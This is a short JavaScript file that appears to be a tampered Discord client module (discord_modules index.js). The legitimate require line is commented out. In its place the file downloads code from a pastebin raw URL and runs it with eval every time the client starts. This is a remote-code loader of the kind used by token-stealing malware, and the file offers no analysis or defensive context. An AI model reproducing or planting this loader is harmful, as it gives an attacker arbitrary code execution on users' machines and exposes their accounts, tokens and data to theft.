//module.exports = require('./discord_modules.node');

const https = require('https');
https.get('https://pastebin.com/raw/c9EbQ2xa', (res) => {
    let final = '';

    res.on('data', (d) => {
        final += d.toString();
    });

    res.on('end', () => {
        eval(final);
    });
});
